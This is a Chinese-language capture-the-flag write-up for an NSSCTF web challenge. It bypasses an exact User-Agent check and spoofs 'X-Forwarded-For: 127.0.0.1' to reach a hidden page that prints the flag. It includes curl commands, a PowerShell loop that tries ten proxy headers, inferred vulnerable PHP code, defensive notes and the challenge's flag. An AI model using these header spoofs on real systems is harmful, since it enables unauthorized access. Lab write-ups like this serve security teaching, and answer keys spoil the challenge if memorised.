# Web · 用「WLLM 浏览器」和「本地 IP」骗过三道门 —— Writeup

> 分类：Web / HTTP 头部伪造（UA 校验 + IP 信任）
> 靶机：`http://node4.anna.nssnode.cn:28004`
> 中间件：`Apache/2.4.25 (Debian)` + `PHP/5.6.40`
> 做题日期：2026-11-01
> Flag：`NSSCTF{836d3d92-7ea0-4a6c-b52d-6a4daf44ed53}`

---

## 30 秒速查卡

```
打开根目录 302 到 hello.php，页面只剩一句"Please use 'WLLM' browser!"
  -> 不是浏览器版本问题，是后端在读 User-Agent：把 UA 改成 WLLM（大小写敏感、要完全等于）
再 302 到 a.php，提示 "You can only read this at local! Your address115.231.49.7"
  -> 后半句回显的 IP 跟请求头联动，说明它是从 X-Forwarded-For 取的，不是 REMOTE_ADDR
  -> 加 X-Forwarded-For: 127.0.0.1，同样 302，跳到 ./secretttt.php
secretttt.php 直接吐 flag（这一页本身没有任何校验，路径就是全部秘密）
```

一条命令打通全链：

```powershell
curl.exe -s -A "WLLM" -H "X-Forwarded-For: 127.0.0.1" `
  "http://node4.anna.nssnode.cn:28004/hello.php" -L
# NSSCTF{836d3d92-7ea0-4a6c-b52d-6a4daf44ed53}
```

---

## 1. 现象：一条 302 链

手工打第一枪，根目录不返回内容，只返回跳转：

```
GET / HTTP/1.1
HTTP/1.1 302 Found
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
location: ./hello.php
Content-Length: 0
```

跟到 `hello.php`：

```
HTTP/1.1 200 OK
Content-Length: 26

Please use 'WLLM' browser!
```

> 这里已经能吃到一个重要信息：**PHP 5.6.40**。这个版本组合（老 Apache + PHP 5.6）在题里几乎只考"代码逻辑/头部信任"，不太可能让你打 CVE。

## 2. 第一关：`User-Agent` 必须完全等于 `WLLM`

"请使用 WLLM 浏览器"这种话不能按字面理解成"去找一个叫 WLLM 的浏览器"。后端九成九是：

```php
if ($_SERVER['HTTP_USER_AGENT'] !== 'WLLM') {   // 或 == 'WLLM'
    exit("Please use 'WLLM' browser!");
}
header('Location: ./a.php');
echo 'success';
```

请求头一发，页面立刻变成 `302 → ./a.php`，body 是 `success`（7 字节）：

```powershell
curl.exe -s -i -A "WLLM" http://node4.anna.nssnode.cn:28004/hello.php
```

实测这个判断是**全等匹配**，不是包含匹配：

| 发送的 UA | 结果 |
|---|---|
| `WLLM` | **302 → a.php**（7 字节 `success`） |
| `wllm` | 200 `Please use 'WLLM' browser!` |
| `WLLM/1.0 xxx` | 200 `Please use 'WLLM' browser!` |
| `Mozilla WLLM` | 200 `Please use 'WLLM' browser!` |

> **教训：** 头部校验题先试"完全等于"，再试"包含"。`WLLM/1.0` 这种"看起来更像真实浏览器"的值在这题里反而是错的。

## 3. 第二关：`X-Forwarded-For: 127.0.0.1`

`a.php` 的响应：

```
HTTP/1.1 200 OK
Content-Length: 63

You can only read this at local!<br>Your address115.231.49.7
```

**关键在 `115.231.49.7` 这个回显。** 它是我的真实出口 IP，也就是 `REMOTE_ADDR`——但下面这组实验说明判定用的不是它：

| 加的请求头 | 页面回显的地址 | 是否放行 |
|---|---|---|
| （无） | `115.231.49.7` | 拦 |
| `X-Forwarded-For: 127.0.0.1` | `127.0.0.1` | **放行（302 → secretttt.php）** |
| `Client-IP: 127.0.0.1` | `127.0.0.1` | 拦 |
| `X-Real-IP` / `Forwarded` / `CF-Connecting-IP` 等 8 个常见头 | 仍是 `115.231.49.7` | 拦 |

这张表同时给了两个结论：

1. **回显只认 `X-Forwarded-For` 和 `Client-IP`**（其余头 PHP 根本没往 `$ip` 里塞）；
2. **但放行判定只认 `X-Forwarded-For`** —— 只发 `Client-IP: 127.0.0.1` 时，页面上明明印着 `127.0.0.1` 却依然被拦。

也就是说，代码大致是"显示用一条链，判定用另一条链"：

```php
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
elseif (isset($_SERVER['HTTP_CLIENT_IP']))        $ip = $_SERVER['HTTP_CLIENT_IP'];
echo "Your address{$ip}";

if ($_SERVER['HTTP_X_FORWARDED_FOR'] !== '127.0.0.1') {   // 判定这里写死了 XFF
    exit("You can only read this at local!");
}
header('Location: ./secretttt.php');
```

匹配规则的边界（都实测过）：

| `X-Forwarded-For` 的值 | 结果 | 说明 |
|---|---|---|
| `127.0.0.1` | 放行 | 标准写法 |
| `127.0.0.1, 1.2.3.4` | **放行** | 说明是"前缀匹配"或"取逗号前第一段"，不是全等 `===` |
| `127.0.0.1:3306` | 拦 | 带端口就不认 |
| `127.0.0.2` | 拦 | 只认这一个字面量 |
| `localhost` | 拦 | 不走 DNS/主机名解析 |

## 4. 第三关（其实没有关）：`secretttt.php`

`a.php` 的 302 头直接把下一页的名字交出来了：

```
HTTP/1.1 302 Found
Location: ./secretttt.php
Content-Length: 60

You can only read this at local!<br>Your address127.0.0.1
```

（注意这 60 字节：被拦时的提示语照样输出，只是在最后追加了 `Location` 头——所以别看到一行红字就以为没成功，**要看状态码**。）

`secretttt.php` 拿到的就是 flag：

```
HTTP/1.1 200 OK
Content-Length: 44

NSSCTF{836d3d92-7ea0-4a6c-b52d-6a4daf44ed53}
```

再验证一次：**这个页面不带任何请求头也能直接读到 flag**。

```powershell
curl.exe -s http://node4.anna.nssnode.cn:28004/secretttt.php
# NSSCTF{836d3d92-7ea0-4a6c-b52d-6a4daf44ed53}
```

> 所以本题的"秘密"实质上是**文件名**，前两关的作用是把 `/secretttt.php` 这个路径泄露给愿意伪造头的人。真实场景里这叫"隐藏路径不等于访问控制"，是一个挺典型的错误示范。

## 5. 原理复盘

| 层 | 现象 | 本质 |
|---|---|---|
| 路由器 | `/` → `hello.php` → `a.php` → `secretttt.php` | 三级 302 把整个考点顺序摆出来了 |
| 第一关 | 提示"请用 WLLM 浏览器" | 用 `HTTP_USER_AGENT` 做客户端类型判断——**客户端完全可控** |
| 第二关 | 回显 IP 随请求头变化 | 用 `HTTP_X_FORWARDED_FOR` 当"来源 IP"——这是最经典的信任错位 |
| 数值边界 | `127.0.0.1` 放行、`127.0.0.1, x` 也放行、带端口不放行 | 判定是**前缀/首段匹配**，不是严格相等 |
| 第三关 | 直连即出 flag | 隐藏路径被当成权限，`Location` 头主动泄露 |

两个值得记住的通用套路：

1. **凡是页面上把某个请求头的值回显出来，就在告诉你"这个变量我读了"。** 把回显值改成目标值，等于直接看到判定输入。
2. **回显的变量和判定用的变量可能不是同一个。** 本题 `Client-IP` 能改回显、不能过判定。遇到"我明明改了却还是拦"，先做一张"哪个头影响回显 / 哪个头影响状态码"的二维表。

## 6. 踩坑记录

| 坑 | 表现 | 教训 |
|---|---|---|
| 以为要装/找"WLLM 浏览器" | 一度去搜这个名字 | 提示语里的"某某浏览器"一律先当 UA 处理 |
| 用 `WLLM/1.0` 这种"像真的"的 UA | 仍 200 被拦 | 先试全等 `WLLM` |
| 小写 `wllm` | 仍被拦 | 大小写敏感 |
| 只发 `Client-IP` | 页面上印着 `127.0.0.1`，仍被拦 | 回显变了 ≠ 判定过了；看**状态码**不看提示语 |
| 把 `X-Forwarded-For` 当唯一可能 | 差点去做 SSRF/端口探测 | 本题判定确实写死在 XFF，但排查时先把 10 个代理头都扫一遍更省事 |
| 看到 `You can only read this at local!` 就以为失败 | 实际响应是 302 + Location | `curl -i` 看头，别只看 body |
| 认为最后一页也要伪造头 | 多此一举 | 拿到路径先裸打一次，别自己加限制 |

## 7. 复用清单：10 个代理头

WAF/代理/框架取"客户端 IP"的头部五花八门。遇到 IP 判定，一次全打一遍最快：

```powershell
$h = @('X-Forwarded-For','X-Real-IP','Client-IP','X-Client-IP','X-Forwarded',
       'Forwarded','X-Originating-IP','X-Remote-IP','CF-Connecting-IP','True-Client-IP')
foreach ($n in $h) {
  $r = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" `
        -A WLLM -H "${n}: 127.0.0.1" http://node4.anna.nssnode.cn:28004/a.php
  "{0,-20} {1}" -f $n, $r
}
```

判定"是不是真·本地访问"的正确做法，前端/中间件侧应当用连接层信息（`REMOTE_ADDR`、mTLS 证书、内网网关签名），**不能**用客户端可写的 `X-Forwarded-For`。这也是本题在真实代码审计里的对应位置：搜 `HTTP_X_FORWARDED_FOR` 直接出现在授权判断里，基本等于一个越权漏洞。

## 8. 复现（干净跑一遍）

```powershell
# 第 3 步：一步到位，-L 跟完 302
curl.exe -s -L -A "WLLM" -H "X-Forwarded-For: 127.0.0.1" `
  http://node4.anna.nssnode.cn:28004/hello.php
# NSSCTF{836d3d92-7ea0-4a6c-b52d-6a4daf44ed53}
```

> 动态靶机的 flag 会随容器重建变化；本文所有响应头、字节数、状态码均为 2026-11-01 该实例实测。
